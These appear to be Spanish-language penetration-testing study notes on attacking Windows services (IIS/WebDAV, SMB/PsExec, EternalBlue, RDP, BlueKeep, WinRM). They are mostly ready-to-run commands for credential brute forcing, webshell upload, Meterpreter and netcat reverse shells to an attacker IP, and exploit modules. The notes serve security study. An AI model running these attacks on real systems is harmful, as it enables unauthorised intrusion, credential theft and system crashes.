----
## EXPLOITING MICROSOFT IIS + WEBDAV

### ¿qué es IIS?

**Microsoft IIS (Internet Information Services)** es el **servidor web de Windows**.  
Usa principalmente los puertos:

- **80/TCP** (HTTP)
- **443/TCP** (HTTPS)

Sirve para alojar **aplicaciones y páginas web** tanto **estáticas** como **dinámicas**, normalmente desarrolladas en:

- **ASP / ASP.NET**
- **PHP**
### archivos ejecutables soportados por IIS:

IIS puede ejecutar distintos tipos de archivos según su configuración:

- **.asp** → Active Server Pages (clásico)
- **.aspx** → ASP.NET
- **.config** → archivos de configuración (muy sensibles)
- **.php** → si PHP está habilitado

👉 Si se consigue **subir uno de estos archivos**, puede lograrse **RCE**.
### ¿qué es WebDAV?

**WebDAV (Web Distributed Authoring and Versioning)** es una **extensión del protocolo HTTP** que permite:

- subir archivos
- modificar archivos
- borrar archivos en el servidor web

Puertos típicos:
- **80/TCP**
- **443/TCP**

Normalmente:
- corre **encima de IIS**
- **requiere credenciales**
- si está mal configurado → **subida de archivos ejecutables**
## pasos para la explotación:

- **identificar que WebDAV está habilitado en IIS**
    - respuestas HTTP
    - métodos PUT / OPTIONS
    - rutas como `/webdav/`

- **fuerza bruta de credenciales WebDAV:**    
    `hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt IP http-get /webdav/`
    👉 Buscamos **usuario y contraseña válidos**.
    
- **una vez obtenidas las credenciales**
    
    - podemos **acceder al directorio WebDAV**    
    - y **subir un archivo ejecutable malicioso**
    - objetivo: **reverse shell**

## herramientas:

### 🔹 davtest

**davtest** sirve para:
- comprobar si WebDAV permite **subir archivos**    
- detectar **qué extensiones ejecutables están permitidas**
`davtest -auth usuario:password -url http://IP/webdav/`

👉 Realiza checks automáticos:

- subida de archivos
- ejecución de scripts
- extensiones permitidas (`.asp`, `.aspx`, `.php`)
### 🔹 cadaver

**cadaver** es un **cliente WebDAV interactivo**, similar a un FTP.

- **conectarse al WebDAV:**
    `cadaver http://IP/webdav/`
    👉 Pedirá credenciales y abrirá una **mini terminal** dentro del directorio remoto.
    
- **subir una webshell ASP:**
    `put /usr/share/webshells/asp/webshell.asp`
    
- **ejecutar comandos desde el navegador**
    - si la extensión es ejecutable → **RCE**
## reverse shell con NC.EXE (Windows):

- **localizar netcat:**
    `locate nc.exe`
    
- **copiarlo al directorio WebDAV:**
    `cp /ruta/nc.exe .`
    
- **ejecutar reverse shell desde la webshell:**
    `\\IP_ATACANTE\smbFolder\nc.exe -e cmd IP_ATACANTE 443`
    (también puede hacerse con PowerShell)
### en el atacante:

- **servidor SMB para compartir nc.exe (shell1):**
    `impacket-smbserver smbFolder $(pwd) -smb2support`
    
- **listener para la reverse shell (shell2):**
    `rlwrap nc -nvlp 443

---
## EXPLOITING WEBDAV WITH METASPLOIT

Escenario:  
Ya tenemos **acceso autenticado al directorio `/webdav`** en un servidor **IIS + WebDAV**.
## MÉTODO 1: Subida manual con MSFVENOM + CADAVER

### 1️⃣ Generar la payload ASP con msfvenom

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_ATACANTE LPORT=443 -f asp > shell.asp`

📌 **Notas importantes**:

- Usar **payload de 32 bits (x86)**  
    ✔ Funciona tanto en sistemas **Windows 32-bit como 64-bit**
    
- El puerto **443** ayuda a evadir firewalls (parece HTTPS)
### 2️⃣ Subir la webshell usando cadaver

`cadaver http://IP_OBJETIVO/webdav`

- Introducir **usuario y contraseña válidos**    
- Una vez dentro del directorio remoto:

`put /root/shell.asp`

👉 El archivo queda accesible desde:

`http://IP_OBJETIVO/webdav/shell.asp`
### 3️⃣ Preparar Metasploit para recibir la conexión

`service postgresql start msfconsole`
#### Crear workspace (buena práctica)

`workspace -a lab`
#### Configurar handler

`use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set LHOST IP_ATACANTE set LPORT 443 run`
### 4️⃣ Ejecutar la payload

- Acceder desde el navegador a:

`http://IP_OBJETIVO/webdav/shell.asp`

🎯 Resultado:

- Se establece una **Meterpreter session**
- Ya estamos en **post-explotación Windows**
    
## MÉTODO 2: Subida directa con Metasploit (automatizado)

Metasploit incluye módulos para **subir archivos ASP vía WebDAV** sin usar cadaver.

### 1️⃣ Buscar módulo

`search iis_webdav_upload_asp`

### 2️⃣ Configurar el módulo

`use exploit/windows/iis/iis_webdav_upload_asp set RHOSTS IP_OBJETIVO set PATH /webdav/metasploit.asp set HttpUsername USUARIO set HttpPassword PASSWORD set LHOST IP_ATACANTE set LPORT 443`

### 3️⃣ Ejecutar

`run`

📌 El módulo:

- Autentica contra WebDAV
- Sube el archivo ASP
- Lanza automáticamente el handler
- Ejecuta la payload

---
## EXPLOITING SMB WITH PsExec

### ¿Qué es SMB?

**SMB (Server Message Block)** es un protocolo de red usado en Windows para:

- compartir archivos
- compartir impresoras
- autenticación en red
- ejecución remota de comandos (si está mal configurado)

Puertos típicos:

- **445/TCP**
- **139/TCP** (legacy)

## NIVELES DE AUTENTICACIÓN EN SMB

SMB utiliza **dos niveles de autenticación**:

### 🔹 User Authentication

- Autenticación del **usuario contra el sistema**
- Valida:
    - usuario
    - contraseña / hash
- Determina **quién eres** en el sistema

Ejemplo:

- `Administrator`
- `juan`
- `svc-backup`
    
### 🔹 Share Authentication

- Controla **a qué recursos compartidos** puede acceder el usuario
- Cada _share_ tiene sus propios permisos:
    - lectura
    - escritura
    - ejecución

Ejemplo:

- `C$`
- `ADMIN$`
- `IPC$`

👉 Puedes estar **autenticado como usuario**, pero **no tener acceso** a todos los shares.

---
## ¿QUÉ ES PsExec?

**PsExec** es una herramienta de Sysinternals que permite:
- autenticarse **legítimamente vía SMB**
- ejecutar **comandos remotos**
- lanzar un **command prompt remoto**

Características:
- Usa **SMB para autenticarse**
- Ejecuta comandos como **SYSTEM**
- No necesita GUI

📌 Es similar a **RDP**, pero:
- RDP → interfaz gráfica
- PsExec → **CMD remoto**

## REQUISITO PREVIO

Antes de usar PsExec necesitamos:

- **Credenciales válidas**    
- Normalmente:
    - usuario **Administrator**
    - o usuario con privilegios administrativos
### Obtención de credenciales

La forma más común:
- **fuerza bruta contra SMB**

Usuarios típicos:

- `Administrator`
- `admin`
- `guest`
- `backup`
- `svc-*`

## FUERZA BRUTA SMB CON METASPLOIT

### 1️⃣ Iniciar Metasploit

`service postgresql start msfconsole`

### 2️⃣ Buscar módulo de login SMB

`search smb_login`

### 3️⃣ Configurar el módulo

`use auxiliary/scanner/smb/smb_login set RHOSTS IP_OBJETIVO set USERFILE /ruta/usuarios.txt set PASSFILE /ruta/passwords.txt run`

🎯 Objetivo:

- Encontrar **usuario:contraseña válidos**

## EXPLOTACIÓN CON PsExec (IMPACKET)

Una vez obtenidas credenciales administrativas:

`psexec.py Administrator@IP_OBJETIVO cmd.exe`
`impacket-psexec WORKGROUP/Administrator@10.10.16.38 -hashes :NTLM`

- Introducir la contraseña cuando la pida
- Se abre una **shell remota**
- Normalmente con privilegios **NT AUTHORITY\SYSTEM**

👉 Ya estamos _dentro hasta la cocina_ 🍽️

## EXPLOTACIÓN CON PsExec (METASPLOIT)

### 1️⃣ Buscar módulo

`search psexec`

### 2️⃣ Usar el módulo

`use exploit/windows/smb/psexec`

### 3️⃣ Configuración

`set RHOSTS IP_OBJETIVO set SMBUser Administrator set SMBPass PASSWORD`

📌 **Payload**:

- El payload por defecto **x86 (32 bits)** es correcto  
    ✔ Funciona en sistemas **32 y 64 bits**
    
### 4️⃣ Ejecutar

`run`

---

## EXPLOTANDO ETERNALBLUE (MS17-010)

### ¿qué es EternalBlue?

**EternalBlue** es un exploit que forma parte de una **colección de vulnerabilidades Windows** que permiten a un atacante **ejecutar código arbitrario de forma remota** y obtener **acceso completo al sistema**.

Fue desarrollado por la **NSA** y posteriormente filtrado por **The Shadow Brokers**.  
Aprovecha una vulnerabilidad en **SMBv1 (puerto 445)** que permite enviar **paquetes especialmente diseñados** para lograr **RCE**.

👉 El acceso obtenido suele ser **NT AUTHORITY/SYSTEM**, por lo que **no es necesaria escalada de privilegios**.
### versiones de Windows afectadas:

- Windows Vista
- Windows 8
- Windows Server 2008
- Windows 8.1
- Windows Server 2012
- Windows 10 (versiones antiguas)
- Windows Server 2016 (sin parche)

`nmap --script "vuln and safe" -p445 ip`-> nos indica si es vulnerable
## explotación con Metasploit:

- **comprobar sistema operativo y SMB:**
    `db_nmap -p 445 -sV IP`
    
- **comprobar si el host es vulnerable (módulo auxiliar):**
    `use auxiliary/scanner/smb/smb_ms17_010 set RHOSTS IP run`
    👉 Verifica si el sistema es **vulnerable sin explotarlo**.

- **explotar EternalBlue:**    
    `use exploit/windows/smb/ms17_010_eternalblue set RHOSTS IP set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST TU_IP set LPORT 4444 run`
    👉 Obtiene **meterpreter como SYSTEM**.
    
- **si queremos una shell clásica en Windows:**
    `shell`
    👉 Abre **cmd.exe** (no `/bin/bash -i`, eso es Linux 😄).
## explotación con Nmap (manual):

- **si vemos el puerto 445 abierto:**
    
    `nmap -sV -p 445 --script smb-vuln-ms17-010 IP`
    👉 Comprueba si el sistema es vulnerable a **MS17-010**.
## explotación manual con AutoBlue (3ndG4me):

- **clonar el repositorio:**
    `git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git cd AutoBlue-MS17-010`
    
- **instalar dependencias:**
    `pip install -r requirements.txt`
    
- **comprobar vulnerabilidad:**
    `python eternal_checker.py IP`
    👉 (dar permisos si es necesario)
    
- **preparar la shellcode (stageless):**
    `./shell_prep.sh`
    👉 Usa **msfvenom** para generar la shellcode (`sc_x64.bin`).
    
- **ponerse en escucha:**
    `nc -nvlp 443`

- **lanzar el exploit:**
	`chmod +x eternalblue_exploit7.py`
    `python eternalblue_exploit7.py IP shellcode/sc_x64.bin`
    👉 (dar permisos de ejecución si es necesario)(puede ser la x86 depende de la arquitectura de la victima)
---
## EXPLOITING RDP

### ¿Qué es RDP?

**RDP (Remote Desktop Protocol)** es un protocolo de Microsoft que permite:

- conectarse **remotamente a un sistema Windows**
- obtener una **interfaz gráfica (GUI) completa**
- interactuar con el sistema como si estuviéramos delante del equipo

Puerto por defecto:

- **3389/TCP**

📌 Importante:

- El puerto **puede cambiarse** por seguridad → hay que **enumerar**
- Requiere **autenticación con usuario y contraseña**
## ENUMERACIÓN DE RDP

### 1️⃣ Escaneo de puertos y servicios

`nmap -sV -p- IP_OBJETIVO`

Objetivo:

- detectar **puertos abiertos no estándar**
- identificar servicios RDP en puertos distintos al 3389

👉 Si aparece un puerto “raro” con fingerprint sospechoso → **posible RDP oculto**

### 2️⃣ Comprobación con Metasploit

`msfconsole search rdp_scanner use auxiliary/scanner/rdp/rdp_scanner set RHOSTS IP_OBJETIVO run`

✔ Confirma si el servicio es RDP  
✔ Puede mostrar:

- versión    
- estado
- si NLA está habilitado
## FUERZA BRUTA CONTRA RDP

Si RDP está expuesto y **no hay bloqueos**, se puede intentar fuerza bruta.
### Hydra (puerto por defecto)

`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://IP_OBJETIVO`
### Hydra (puerto cambiado)

`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt      rdp://IP_OBJETIVO -s 3333`

📌 Notas:

- Muy ruidoso ⚠️
- Ideal solo en **labs o entornos controlados**
- Usuarios típicos:
    
    - `Administrator`
    - `admin`
    - `user`
    - `test`
    
## CONEXIÓN AL SISTEMA VÍA RDP

Una vez obtenidas credenciales válidas:
### Usando xfreerdp

`xfreerdp /u:USUARIO /p:CONTRASEÑA /v:IP_OBJETIVO:PUERTO`

Ejemplo:

`xfreerdp /u:Administrator /p:Password123 /v:10.10.10.10:3333`

🎯 Resultado:

- Acceso completo a la **GUI de Windows**
- Posibilidad de:
    - ejecutar herramientas
    - escalar privilegios
    - robar credenciales
    - moverte lateralmente
----

## EXPLOITING BLUEKEEP (CVE-2019-0708)

### ¿qué es BlueKeep?

**BlueKeep** es una vulnerabilidad crítica que afecta al servicio **RDP (Remote Desktop Protocol)** y permite a un atacante **ejecutar código de forma remota sin autenticación**.

Explota un fallo en **RDP** que permite acceder a un **chunk de memoria del kernel**, lo que provoca **Remote Code Execution a nivel de kernel**.
Puerto **3389** pero puede correr en otros puertos.

👉 Al ejecutarse en el kernel, el atacante obtiene **máximos privilegios**:

`NT AUTHORITY\SYSTEM`

⚠️ No requiere credenciales  
⚠️ Puede provocar **crash o pantallazo azul**  
⚠️ Muy inestable, no aconsejado!!
### advertencias importantes:

- **solo usar targets “verificados”**
- algunos targets pueden ser **ilegítimos**
- el exploit **puede tumbar el sistema**
- puede requerir **varios intentos**
### versiones de Windows afectadas:

- Windows XP
- Windows Vista
- Windows 7
- Windows Server 2008
- Windows Server 2008 R2
## explotación con Metasploit:

- **comprobar que RDP está abierto:**
    `nmap -p 3389 IP`
    
- **comprobar si el sistema es vulnerable (módulo auxiliar):**
    `search bluekeep use auxiliary/scanner/rdp/cve_2019_0708_bluekeep set RHOSTS IP run`
    👉 Verifica vulnerabilidad **sin explotarla**.
    
- **explotar BlueKeep (solo x64):**
    `search bluekeep use exploit/windows/rdp/cve_2019_0708_bluekeep_rce`
    
    - **ver targets disponibles:**
        `show targets`
        
    - **seleccionar el target adecuado (según la VM):**
        `set TARGET X`
        
    - **configurar payload (meterpreter):**
        `set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST TU_IP set LPORT 4444 run`
---

## EXPLOITING WINRM

### ¿Qué es WinRM?

**WinRM (Windows Remote Management)** es un protocolo de administración remota de Windows basado en **WS-Management**.

👉 Conceptualmente es **el SSH de Windows**:

- permite **acceso remoto por consola (CMD / PowerShell)**
- ejecución de comandos en sistemas Windows
- administración remota de equipos en red

📌 Importante:

- **No viene habilitado por defecto**
- Suele activarse en:
    - entornos corporativos
    - servidores
    - sistemas gestionados por dominio
## PRINCIPALES USOS DE WINRM

- Acceso remoto e interacción con **hosts Windows en red local**
- Ejecución remota de comandos
- Gestión y configuración de sistemas Windows
- Automatización de tareas administrativas

## PUERTOS UTILIZADOS

- **5985/TCP** → HTTP    
- **5986/TCP** → HTTPS

👉 Si alguno está abierto, **WinRM está probablemente activo**.

## HERRAMIENTAS CLAVE

- **CrackMapExec / NetExec**  
    Enumeración, validación de credenciales y ejecución remota
- **Evil-WinRM**  
    Shell interactiva PowerShell (la joya de la corona 💎)
- **Metasploit**  
    Ejecución remota de scripts y comandos vía WinRM

## ENUMERACIÓN INICIAL

### Escaneo de puertos

`nmap -sV -p- IP_OBJETIVO`

Buscar:

- 5985 o 5986 abiertos
- fingerprints relacionados con WinRM / HTTPAPI
## EXPLOTACIÓN CON CRACKMAPEXEC / NETEXEC

### 1️⃣ Comprobar credenciales

`nxc winrm IP_OBJETIVO -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

📌 Notas:

- Se pueden usar **listas de usuarios y contraseñas**
- Ideal para **password spraying**
### 🔥 ¿Qué significa `Pwned!`?

Si la salida muestra:

`Pwned!`

👉 Significa que:

- las credenciales son válidas
- el usuario tiene **privilegios administrativos**
- **podemos ejecutar comandos remotamente**

(Traducción: _WinRM ha caído y lo sabe_ 😎)

### 2️⃣ Ejecución de comandos remotos

`nxc winrm IP_OBJETIVO -u USER -p PASS -x "whoami"`

- Ejecuta el comando indicado    
- Devuelve la salida por consola
- Muy útil para **post-explotación rápida**

## SHELL INTERACTIVA CON EVIL-WINRM

La forma más cómoda y realista de explotar WinRM.

`evil-winrm -u 'USER' -p 'PASS' -i IP_OBJETIVO`

🎯 Resultado:

- Shell PowerShell interactiva
- Subida/bajada de archivos
- Ejecución de scripts
- Ideal para:
    - escalada de privilegios
    - dumping de credenciales
    - persistencia
        
## EXPLOTACIÓN CON METASPLOIT

### 1️⃣ Buscar módulo

`search winrm_script_exec`

### 2️⃣ Configurar el módulo

`use exploit/windows/winrm/winrm_script_exec set RHOSTS IP_OBJETIVO set USERNAME USER set PASSWORD PASS`

### ⚙️ Opción importante

`set FORCE_VBS true`

📌 ¿Para qué sirve?

- Fuerza el uso de **VBScript**
- Útil cuando:
    - PowerShell está restringido
    - hay políticas de ejecución activas
- Aumenta compatibilidad en sistemas antiguos
### 3️⃣ Ejecutar

`exploit`

📌 Nota:

- Este módulo **puede fallar**
- WinRM es sensible a:
    - configuración del sistema
    - políticas de seguridad
    - versión de Windows

👉 Si falla Metasploit → **Evil-WinRM suele funcionar mejor**.








